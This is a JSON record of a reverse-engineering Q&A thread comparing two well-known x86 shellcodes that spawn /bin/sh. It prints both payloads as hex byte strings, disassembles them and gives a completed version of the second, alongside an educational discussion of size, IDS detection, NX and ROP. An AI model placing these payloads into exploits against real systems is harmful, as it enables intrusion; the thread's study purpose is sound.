@@ -1,0 +1,40 @@
+{
+  "title": "Why there are two different shellcodes for bin/sh with much different syntax and which one is better to use? (x86)",
+  "link": "https://reverseengineering.stackexchange.com/questions/19621/why-there-are-two-different-shellcodes-for-bin-sh-with-much-different-syntax-and",
+  "content": "I have found two shellcodes for spawning /bin/sh which are much different from each other. The second one is hardly ever found on the net, and it mostly comes up in reverse engineering websites:\n\n```\n1. \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"\n   \"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";\n\n```\nhttp://shell-storm.org/shellcode/files/shellcode-811.php\n\n```\n2.  \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\"\n    \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\"\n    \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"\n\n```\nhttp://phrack.org/issues/49/14.html\n\nhttps://stackoverflow.com/questions/2705854/can-anyone-explain-this-code-to-me\n\nSo:\n\n",
+  "votes": "2",
+  "answers": 2,
+  "views": "2k",
+  "tags": [
+    "disassembly",
+    "assembly",
+    "x86"
+  ],
+  "user": "Richard Jones",
+  "time": "Oct 15, 2018 at 7:26",
+  "comments": [
+    {
+      "user": "user202729",
+      "text": "Better in terms of what?",
+      "time": null
+    }
+  ],
+  "answers_data": [
+    {
+      "content": "The second one you cite is coming from a historical paper (\"Smashing The Stack For Fun And Profit\" by Aleph One in Phrack #49, 1996) (note that you removed the final '/bin/sh' which ruins totally the shellcode). It is probably the most well known explanation of what is a buffer-overflow and how to exploit it. The article itself comes with this shellcode which has been used as it is by numerous people to learn and to exploit in the wild.\n\nNowadays, this shellcode will be detected if sent in clear on the network by most of the IDS (Intrusion Detection Systems) and stopped before it reaches its target. Moreover, it is an educational shellcode (read the paper, AlephOne explain how to build such a shellcode), so it is a bit big for a shellcode.\n\nSo, the second shellcode is well-known and big, two reasons to not use it except if you want to understand what it does and how to write such thing.\n\nThe first shellcode you pointed, is designed to take the less space possible (only 28 bytes compared to 46 with the second). It may be useful to have a small shellcode because sometimes you will have only a small memory space to write it. So, if your shellcode is too big, it won't execute properly.\n\nThis is not an address, it is the string //sh (in little-endian), look at the character 0x2f which is / (in ASCII code) repeated twice and, then, sh.\n\nConcerning ASLR and PIE, these security mechanisms came a few years after shellcodes. ASLR was designed to prevent easy exploitation of buffer-overflow by randomizing addresses. This is not the worst thing against buffer-overflow exploitation and shellcodes, in fact. The worst is NX (non-executable stack). And, in fact, since NX is here we are now using ROP (Return-Oriented Programming) better than shellcode (but I guess this will be your next step once you understand these shellcodes).\n\nIf you want to understand fully the shellcode, read the Aleph One paper... \n\nThis is the best explanation I know about it.\n\nThey vary in shapes and size because of the IDS, once a shellcode is common, it can be scanned and found in TCP/IP packets and stopped during an attack through the network. That is why there exists a great variety of it (some are self-encrypted with various keys to evade IDS).\n\nAnd, then, you also have to take into account the way you inject the shellcode in the program, you may have several limitations (only ASCII or UTF-8 characters for examples). This will give another set of shellcodes (for example, see this article).\n\nFinally, as I said at the beginning you may have size constraints. Which tends to try to have the smallest shellcode possible.\n\n",
+      "votes": "4",
+      "user": "perror",
+      "time": "Oct 15, 2018 at 7:33",
+      "is_accepted": true,
+      "comments": []
+    },
+    {
+      "content": "Both of them have the similar purpose and uses same syscalls (execve and restart_syscall), they have no difference in action (just programming style).\nIn second shellcode you can easily change the executable command. On the other hand, if the buffer in which you write you payload has a limited size, first one is more compact.\n\n$0x68732f2f is not an address, It's the //sh string for passing to interrupt so it's not related to ASLR and PIE\n\n```\n[0x00000000]> pd # shellcode1\n            0x00000000      31c0           xor eax, eax\n            0x00000002      50             push eax\n            0x00000003      682f2f7368     push 0x68732f2f             ; '//sh'\n            0x00000008      682f62696e     push 0x6e69622f             ; '/bin'\n            0x0000000d      89e3           mov ebx, esp ; copy string (command) address in ebx\n            0x0000000f      89c1           mov ecx, eax\n            0x00000011      89c2           mov edx, eax\n            0x00000013      b00b           mov al, 0xb                 ; 11\n            0x00000015      cd80           int 0x80  ; execve()\n            0x00000017      31c0           xor eax, eax\n            0x00000019      40cd80         int 0x80 ; restart_syscall()\n\n```\n```\n[0x00000000]> pd # shellcode2\n        ,=< 0x00000000      eb1f           jmp 0x21\n        |   0x00000002      5e             pop esi\n        |   0x00000003      897608         mov dword [esi + 8], esi\n        |   0x00000006      31c0           xor eax, eax\n        |   0x00000008      884607         mov byte [esi + 7], al\n        |   0x0000000b      89460c         mov dword [esi + 0xc], eax\n        |   0x0000000e      b00b           mov al, 0xb               ; 11\n        |   0x00000010      89f3           mov ebx, esi ; copy string (command) address in ebx\n        |   0x00000012      8d4e08         lea ecx, [esi + 8]          ; 8\n        |   0x00000015      8d560c         lea edx, [esi + 0xc]        ; 12\n        |   0x00000018      cd80           int 0x80 ; execve()\n        |   0x0000001a      31db           xor ebx, ebx\n        |   0x0000001c      89d8           mov eax, ebx\n        |   0x0000001e      40cd80         int 0x80 ; restart_syscall()\n        `-> 0x00000021      e8dcffffff     call 2 ; push string (command) address to stack and jump to 0x00000002 (0x00000025 must be start of command's string)\n\n```\nUpdated : shellcode problem fixed in the question\n\nYour second shellcode is incomplete because after your call you must involve your command as a string, and call instruction is used for pushing address of string in the memory.\n\nThis is fixed version of your second shellcode.\n\n```\n\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"\n\n```\n\n\n",
+      "votes": "3",
+      "user": "Sajjad Pourali",
+      "time": "Oct 14, 2018 at 16:36",
+      "is_accepted": false,
+      "comments": []
+    }
+  ]
+}
